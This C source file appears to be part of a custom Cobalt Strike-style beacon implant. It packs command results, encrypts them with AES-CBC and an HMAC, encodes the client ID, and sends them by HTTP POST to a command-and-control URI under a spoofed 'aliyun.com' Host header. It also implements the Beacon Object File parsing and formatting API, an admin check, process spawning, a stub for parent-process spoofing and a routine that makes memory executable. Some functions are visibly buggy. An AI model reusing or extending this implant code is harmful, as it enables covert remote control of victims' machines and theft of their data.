#include <windows.h>
#include "Command.h"
#include "Http.h"
#include <pthread.h>
#pragma warning(disable:4996)
extern int SleepTime;
extern int Counter;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
extern unsigned char AESRandaeskey[16];\
extern int clientID;
struct Buffer {
    unsigned char* data;
    size_t capacity;
    size_t length;
};

void buffer_init(struct Buffer* buf) {
    buf->data = malloc(1);  // 初始容量为1
    if (buf->data == NULL) {
        fprintf(stderr, "内存分配失败\n");
        exit(EXIT_FAILURE);
    }
    buf->data[0] = '\0';
    buf->capacity = 1;
    buf->length = 0;
}

void buffer_append(struct Buffer* buf, unsigned char* str, size_t* buflen) {
    size_t len = buflen;
    if (buf->data == NULL) {
        buf->data = (unsigned char*)malloc(len);
        if (buf->data == NULL) {
            fprintf(stderr, "内存分配失败\n");
            exit(EXIT_FAILURE);
        }
        buf->capacity = len;
        buf->length = len;
        memcpy(buf->data, str, len);
    }
    else {
        size_t required_capacity = buf->length + len;
        if (required_capacity > buf->capacity) {
            while (required_capacity > buf->capacity) {
                buf->capacity *= 2;
            }
            unsigned char* new_data = (unsigned char*)realloc(buf->data, buf->capacity);
            if (new_data == NULL) {
                fprintf(stderr, "内存分配失败\n");
                exit(EXIT_FAILURE);
            }
            buf->data = new_data;
        }
        memcpy(buf->data + buf->length, str, len);
        buf->length += len;
    }
}

void buffer_free(struct Buffer* buf) {
    free(buf->data);
    buf->data = NULL;
    buf->capacity = 0;
    buf->length = 0;
}

void SleepTimes(unsigned char* Buf) {
    // 等待指定的时间（以毫秒为单位）
    uint8_t buf4[4];
    memcpy(buf4, Buf, 4);
    uint32_t sleep = bigEndianUint32(buf4);
    SleepTime = sleep;
}

unsigned char* MakePacket(int callback,unsigned char* buff,size_t lenn,size_t* buflen) {
    Counter += 1;
    //printf("1111 %d\n", lenn);

    struct Buffer buf;
    buffer_init(&buf);
    
    uint8_t counterBytes[4];
    PutUint32BigEndian(counterBytes, (uint32_t)Counter);
    buffer_append(&buf, counterBytes,4);
    //printf("buf.dat111 : %d\n", buf.length);
    for (size_t i = 0; i < buf.length; ++i) {
        //printf("0x%02x, ", buf.data[i]);
    }
    //printf("\n");
    if (buff != NULL) {
        uint8_t resultLenBytes[4];
        //printf("1111 %d\n", lenn);
        int resultLen = (int)lenn + 4;
        PutUint32BigEndian(resultLenBytes, (uint32_t)resultLen);
        for (size_t i = 0; i < 4; ++i) {
            //printf("0x%02x, ", resultLenBytes[i]);
        }
        buffer_append(&buf, resultLenBytes,4);
        //printf("buf.dat22222 : %d\n", buf.length);
        for (size_t i = 0; i < buf.length; ++i) {
            //printf("0x%02x, ", buf.data[i]);
        }

    }
    uint8_t replyTypeBytes[4];
    PutUint32BigEndian(replyTypeBytes, (uint32_t)callback);
    buffer_append(&buf, replyTypeBytes,4);
    buffer_append(&buf, buff,lenn);

    size_t decryptAES_CBCdatalen;
    ////printf("\n");
    ////printf("buf.dat33333 : %d\n", buf.length);
    //for (size_t i = 0; i < buf.length; ++i) {
    //    //printf("0x%02x, ", buf.data[i]);
    //}
    ////printf("\n");
   unsigned char* EncryptAES_CBCdata = AesCBCEncrypt(buf.data, AESRandaeskey, buf.length, &decryptAES_CBCdatalen);
    //printf("\n");
    //printf("EncryptAES_CBCdata : %d\n", decryptAES_CBCdatalen);
   /* for (size_t i = 0; i < decryptAES_CBCdatalen; ++i) {
        //printf("0x%02x, ", EncryptAES_CBCdata[i]);
    }
    //printf("\n");*/
    EncryptAES_CBCdata[decryptAES_CBCdatalen] = '\0';
    unsigned char* encrypted;
    encrypted = EncryptAES_CBCdata + 16;
    buffer_free(&buf);


    int sendLen = decryptAES_CBCdatalen;
    uint8_t sendLenBytes[4];
    PutUint32BigEndian(sendLenBytes, (uint32_t)sendLen);
    //printf("0000000000000000\n");
    for (size_t i = 0; i < 4; ++i) {
        //printf("%d, ", sendLenBytes[i]);
    }
    //printf("\n");
    buffer_init(&buf);
    buffer_append(&buf, sendLenBytes,4);
    buffer_append(&buf, encrypted, decryptAES_CBCdatalen-16);
    size_t encryptedBytesLen = decryptAES_CBCdatalen - 16;
   /* //printf("11111111111111111\n %d", encryptedBytesLen);
    for (size_t i = 0; i < encryptedBytesLen; ++i) {
        //printf("%d %d ", i, encrypted[i]);
    }*/


    unsigned char* hmacResult = HMkey(encrypted, encryptedBytesLen);
    ////printf("222222222222222222\n %d");
    //for (size_t i = 0; i <16; ++i) {
    //    //printf("%d %d \n", i, hmacResult[i]);
    //}
    
    buffer_append(&buf, hmacResult,16);
    *buflen = buf.length;
    /*//printf("33333333333\n %d");
    for (size_t i = 0; i < buf.length; ++i) {
        //printf("%d %d \n", i, buf.data[i]);
    }*/
    return buf.data;
        


}
unsigned char* PushResult(unsigned char* finalPaket, size_t* buflen) {
    //printf("finalPaket 2: %d \n", buflen);
    int temp = clientID;
    int digitCount = 0;
    while (temp != 0) {
        temp /= 10;
        ++digitCount;
    }

    // 计算字符数组的长度，包括负号和终止符号 '\0'
    int charArrayLength = (clientID < 0) ? digitCount + 2 : digitCount + 1;

    // 使用 malloc 动态分配足够的内存来存储转换后的字符串
    unsigned char* CharId = (unsigned char*)malloc(charArrayLength * sizeof(char)-1);
    if (CharId == NULL) {
        //printf("内存分配失败\n");
        exit(EXIT_FAILURE);
    }

    // 使用 sprintf 将整数值转换为字符串并将其存储在动态分配的内存中
    sprintf(CharId, "%d", clientID);
    size_t codelen;
    unsigned char* MaskEncodeid = MaskEncode(CharId, charArrayLength * sizeof(char)-1,&codelen);

    unsigned char netbiosKey = 'A'; // Replace 'a' with your desired key
    size_t NetbiosEncodeIdlen;
    unsigned char* id = NetbiosEncode(MaskEncodeid, strlen(MaskEncodeid), netbiosKey, &NetbiosEncodeIdlen);
    id[NetbiosEncodeIdlen] = '\0';
    //printf("id %s: \n", id);
    //for (size_t i = 0; i < NetbiosEncodeIdlen; ++i) {
    //    //printf("%d ", id[i]);
    //}
    //printf("\n");
    size_t codelen1;
    //printf("finalPaket 3: %d \n", buflen);
    //for (size_t i = 0; i < buflen; ++i) {
    //    //printf("%d ", finalPaket[i]);
    //}
    ////printf("\n");
    unsigned char* MaskEncodedata = MaskEncode(finalPaket, buflen, &codelen1);
    
    char* data = base64Encode(MaskEncodedata, codelen1);
  

    char header[] = "User:";
    struct curl_slist* headers = NULL;
    char* concatenatedString = (char*)malloc(strlen(id) +strlen(header) + strlen(Http_post_id_prepend) + strlen(Http_post_id_append) + 1);
    //strcpy(concatenatedString, Http_post_id_prepend);
    //strcat(concatenatedString, id);
    //strcat(concatenatedString, Http_post_id_append);
   
    snprintf(concatenatedString, strlen(id)+ strlen(header) + strlen(Http_post_id_prepend) + strlen(Http_post_id_append) + 1, "%s%s%s%s", header, Http_post_id_prepend, id, Http_post_id_append);
   // //printf("3333333 %s ", concatenatedString);
    headers = curl_slist_append(headers, "Host:aliyun.com");
    headers = curl_slist_append(headers, concatenatedString);
    
    //printf("Concatenated String: %s\n", concatenatedString);
    char* datastring = (char*)malloc(strlen(data) + strlen(Http_post_client_output_prepend) + strlen(Http_post_client_output_append) + 1);
    /*memcpy(datastring,Http_post_client_output_prepend, strlen(Http_post_client_output_prepend));
    memcpy(datastring+ strlen(Http_post_client_output_prepend), data, strlen(data));
    memcpy(datastring + strlen(Http_post_client_output_prepend)+ strlen(data), Http_post_client_output_append,strlen(Http_post_client_output_append));*/
    strcpy(datastring, Http_post_client_output_prepend);
    strcat(datastring, data);
    strcat(datastring, Http_post_client_output_append);
    perform_post_request(Http_Post_uri,  headers, datastring);

}


unsigned char* criticalSection(unsigned char* buf, size_t lenn,int callback) {
    size_t buflen;
    
    unsigned char* finalPaket = MakePacket(callback, buf, lenn, &buflen);
   /* //printf("finalPaket1 : %d\n", buflen);
    for (size_t i = 0; i < buflen; ++i) {
        //printf("0x%02x, ", finalPaket[i]);
    }
    //printf("\n");*/
    
    unsigned char* result = PushResult(finalPaket, buflen);
    


}

void DataProcess(unsigned char* buf, size_t lenn, int callback) {
    buf[lenn] = '\0';
    if (callback == 0) {
        size_t outputLen;
        unsigned char* utf8Buf = CodepageToUTF8(buf, lenn, &outputLen);
        if (utf8Buf != NULL) {
            //printf("UTF-8 output: %s\n", utf8Buf);
            // 使用utf8Buf进行后续操作，可能需要释放内存
            // 例如，如果CodepageToUTF8分配了内存，可能需要使用free(utf8Buf)释放它
            // 请根据CodepageToUTF8的实现来确定是否需要释放内存
        }
    }

    criticalSection(buf, lenn, callback);

    
}


void BeaconFormatAlloc(formatp* format, int maxsz) {
    char* buff = (char*)malloc(maxsz);
    return BeaconFormatInit(format, buff, maxsz);
}

void BeaconFormatInit(formatp* format, char* buff, int buffsize) {
    format->length = 0;
    format->original = buff;
    format->buffer = buff;
    format->size = buffsize;
    memset(buff, 0, buffsize);
}




void BeaconFormatPrintf(formatp* format, char* fmt, ...) {
    va_list ArgList;
    va_start(ArgList, fmt);
    int v2 = vprintf(fmt, ArgList);
    if (v2 > 0) {
        int size = format->size - format->length;
        if (v2 < size) {
            int v4 = vsprintf_s(format->buffer, size, fmt, ArgList);
            format->buffer += v4;
            format->length += v4;
        }
    }
}

int BeaconFormatlength(formatp* format) {
    return format->length;
}


void BeaconFormatFree(formatp* format)
{
    memset(format->original, 0, format->size);
    free(format->original);
}

char* BeaconDataPtr2(datap* parser)
{
    int size = BeaconDataInt(parser);
    if (size)
    {
        return BeaconDataPtr(parser, size);
    }
    return 0;
}

char* BeaconDataPtr3(datap* parser, int* outsize)
{
    int size = BeaconDataInt(parser);
    if (size)
    {
        *outsize = size;
        return BeaconDataPtr(parser, size);

    }
    return 0;
}

void BeaconDataParse(datap* parser, char* buffer, int size)
{
    parser->original = buffer;
    parser->buffer = buffer;
    parser->length = size;
    parser->size = size;
}

char* BeaconDataPtr(datap* parser, int size)
{
    char* result = 0;
    if (parser->length < size)
    {
        return 0;
    }
    result = parser->buffer;
    parser->buffer += size;
    parser->length -= size;
    return result;
}

int	BeaconDataInt(datap* parser)
{
    int result;
    if (parser->length < sizeof(int))
    {
        return 0;
    }
    result = ntohl(*(u_long*)parser->buffer);
    parser->buffer += sizeof(int);
    parser->length += sizeof(int);
    return result;
}

short BeaconDataShort(datap* parser)
{
    short result;

    if (parser->length < sizeof(short))
    {
        return 0;
    }
    result = ntohs(*(u_short*)parser->buffer);
    parser->buffer += sizeof(short);
    parser->length -= sizeof(short);
    return result;
}

int	BeaconDataLength(datap* parser)
{
    return parser->length;
}
char* BeaconDataExtract(datap* parser, int* outsize)
{
    int size = 0;
    char* data = BeaconDataPtr3(parser, &size);
    if (outsize)
    {
        *outsize = size;
    }
    return size != 0 ? data : 0;
}
void BeaconFormatReset(formatp* format)
{
    format->buffer = format->original;
    format->length = 0;
}
void BeaconFormatAppend(formatp* format, char* text, int len)
{
    if (len < format->size - format->length)
    {
        if (len)
        {
            memcpy(format->buffer, text, len);
            format->buffer += len;
            format->length += len;
        }
    }
}
char* BeaconFormatOriginalPtr(formatp* format)
{
    return format->original;
}
char* BeaconFormatToString(formatp* format, int* size)
{
    if (!size)
    {
        return 0;
    }
    int length = BeaconFormatlength(format);
    *size = length;
    return BeaconFormatOriginalPtr(format);
}

void BeaconFormatInt(formatp* format, int value)
{
    value = htonl(value);
    BeaconFormatAppend(format, (char*)&value, 4);
}
datap* BeaconMaketoken;
extern HANDLE pTokenHandle;
void BeaconErrorD() {
    return;
}
void BeaconRevertToken()
{
    return;
}
void BeaconErrorDD()
{
    return;
}
void BeaconErrorNA()
{
    return;
}
BOOL is_admin()
{
    struct _SID_IDENTIFIER_AUTHORITY pIdentifierAuthority;

    PSID pSid;

    BOOL IsMember;

    pIdentifierAuthority.Value[0] = 0;
    pIdentifierAuthority.Value[1] = 0;
    pIdentifierAuthority.Value[2] = 0;
    pIdentifierAuthority.Value[3] = 0;
    pIdentifierAuthority.Value[4] = 0;
    pIdentifierAuthority.Value[5] = 5;
    IsMember = AllocateAndInitializeSid(&pIdentifierAuthority, 2u, 0x20u, 0x220u, 0, 0, 0, 0, 0, 0, &pSid);
    if (!IsMember)
    {
        return IsMember;
    }
    if (!CheckTokenMembership(0, pSid, &IsMember))
    {
        IsMember = 0;
    }
    FreeSid(pSid);
    return IsMember;
}
int Is_Wow64(HANDLE hProcess)
{
    HMODULE kernel32base;
    BOOL(__stdcall * IsWow64Process)(HANDLE, PBOOL);
    int result;
    int v4 = 0;
    kernel32base = GetModuleHandleA("kernel32");
    IsWow64Process = (BOOL(__stdcall*)(HANDLE, PBOOL))GetProcAddress(kernel32base, "IsWow64Process");
    if (!IsWow64Process || (result = IsWow64Process(hProcess, &v4)) != 0)
    {
        result = v4;
    }
    return result;
}
void resolve_spawntopath(LPSTR lpDst, BOOL x86)
{
    char Buffer[256];
    memset(Buffer, 0, sizeof(Buffer));
    if (!x86)
    {
       /* if (spawntoPath_x64 && strlen(spawntoPath_x64))
        {
            _snprintf(Buffer, 0x100u, "%s", spawntoPath_x64);
            BeaconExpandEnvironmentStringsA(Buffer, lpDst, 0x100u);
            return;
        }
        char* post_ex_spawnto_x64 = get_str(30);
        _snprintf(Buffer, 0x100u, "%s", post_ex_spawnto_x64);
        BeaconExpandEnvironmentStringsA(Buffer, lpDst, 0x100);*/
        return;
    }
   /* if (!spawntoPath_x86 || !strlen(spawntoPath_x86))
    {
        char* post_ex_spawnto_x86 = get_str(29);
        _snprintf(Buffer, 0x100u, "%s", post_ex_spawnto_x86);
        BeaconExpandEnvironmentStringsA(Buffer, lpDst, 0x100);
        return;
    }*/
}
void getspawntopath(char* path_buffer, BOOL x86)
{

    memset(path_buffer, 0, 256);
    if (!x86)
    {
        resolve_spawntopath(path_buffer, 0);
        return;
    }
    HANDLE hPrcoess = GetCurrentProcess();
    if (Is_Wow64(hPrcoess))
    {
        resolve_spawntopath(path_buffer, 1);
        return;
    }
    resolve_spawntopath(path_buffer, 1);
    char* pch = strstr(path_buffer, "syswow64");
    if (pch)
    {
        memcpy(pch, "system32", 8);
    }
}
typedef struct STARTUPINFOA {
    DWORD   cb;
    LPSTR   lpReserved;
    LPSTR   lpDesktop;
    LPSTR   lpTitle;
    DWORD   dwX;
    DWORD   dwY;
    DWORD   dwXSize;
    DWORD   dwYSize;
    DWORD   dwXCountChars;
    DWORD   dwYCountChars;
    DWORD   dwFillAttribute;
    DWORD   dwFlags;
    WORD    wShowWindow;
    WORD    cbReserved2;
    LPBYTE  lpReserved2;
    HANDLE  hStdInput;
    HANDLE  hStdOutput;
    HANDLE  hStdError;
};
typedef struct
{
    char* path; /*进程路径*/
    int path_size; /*进程路径长度*/
    STARTUPINFOA* pSTARTUPINFOA;
    PROCESS_INFORMATION* pPROCESS_INFORMATION;
    DWORD dwCreationFlags;
    BOOL ignoreToken;
} BeaconStartProcess;

int CreateProcessCore (BeaconStartProcess* pBeaconStartProcess) {

    if (!CreateProcessA(
        NULL,
        pBeaconStartProcess->path,
        NULL,
        NULL,
        TRUE,
        pBeaconStartProcess->dwCreationFlags,
        NULL,
        NULL,
        pBeaconStartProcess->pSTARTUPINFOA,
        pBeaconStartProcess->pPROCESS_INFORMATION))
    {
        int LastError = GetLastError();
        
        return 0;
    }

    return 1;


}
int BeaconCreateProcess(char* path, int path_size, STARTUPINFOA* sInfo, PROCESS_INFORMATION* pInfo, int dwCreationFlags, int ignoreToken, int PPID)
{
    BeaconStartProcess pStartProcess;

    pStartProcess.path = path;
    pStartProcess.path_size = path_size;
    pStartProcess.pSTARTUPINFOA = sInfo;
    pStartProcess.pPROCESS_INFORMATION = pInfo;
    pStartProcess.dwCreationFlags = dwCreationFlags;
    pStartProcess.ignoreToken = ignoreToken;
    return CreateProcessCore(&pStartProcess);
}
////父进程欺骗
//DWORD gBeaconPPID;
//int BeaconExecuteCommand(char* path, int path_size, STARTUPINFOA* sInfo, PROCESS_INFORMATION* pInfo, int dwCreationFlags, int ignoreToken)
//{
//    return BeaconCreateProcess(path, path_size, sInfo, pInfo, dwCreationFlags, ignoreToken, gBeaconPPID);
//}


void BeaconcloseAllHandle(PROCESS_INFORMATION* pi)
{
    
    if (pi->hProcess != (HANDLE)-1 && pi->hProcess)
    {
        CloseHandle(pi->hProcess);
    }
    if (pi->hThread != (HANDLE)-1)
    {
        if (pi->hThread)
        {
            CloseHandle(pi->hThread);
        }
    }
}
BOOL __cdecl toWideChar(char* lpMultiByteStr, wchar_t* lpWideCharStr, unsigned int max)
{
    unsigned int size;

    size = MultiByteToWideChar(0, 0, lpMultiByteStr, -1, 0, 0);
    if (size == -1 || size >= max)
    {
        return 0;
    }
    MultiByteToWideChar(0, 0, lpMultiByteStr, -1, lpWideCharStr, max);
    return 1;
}
int CheckMemoryRWX(LPVOID lpAddress, SIZE_T dwSize)
{
    DWORD flOldProtect;
    if (VirtualProtect(lpAddress, dwSize, PAGE_EXECUTE_READWRITE, &flOldProtect))
    {
        return 1;
    }
    //BeaconErrorD(0x11, GetLastError());
    return 0;
}